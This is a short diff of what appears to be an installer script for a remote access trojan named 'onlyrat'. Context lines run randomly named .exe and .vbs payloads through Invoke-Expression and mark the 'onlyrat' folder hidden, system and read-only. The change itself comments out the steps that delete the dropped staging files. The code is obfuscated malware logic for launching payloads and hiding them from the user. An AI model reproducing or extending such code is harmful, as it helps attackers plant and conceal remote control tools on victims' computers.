@@ -55,7 +55,7 @@ Invoke-Expression "./UaAIVKpYhR.exe"; Invoke-Expression "./$grOzVTtUmS.vbs"
 Set-Location C:\Users
 attrib +h +s +r onlyrat 
 Set-Location $NyZnoLKCIs
-Remove-Item $CRYnrkaDbe
-Remove-Item XbrMzmCUiE.txt
-Remove-Item UJbMLjTIDr.txt
-Remove-Item KFPGaEYdcz.ps1
+# Remove-Item $CRYnrkaDbe
+# Remove-Item XbrMzmCUiE.txt
+# Remove-Item UJbMLjTIDr.txt
+# Remove-Item KFPGaEYdcz.ps1
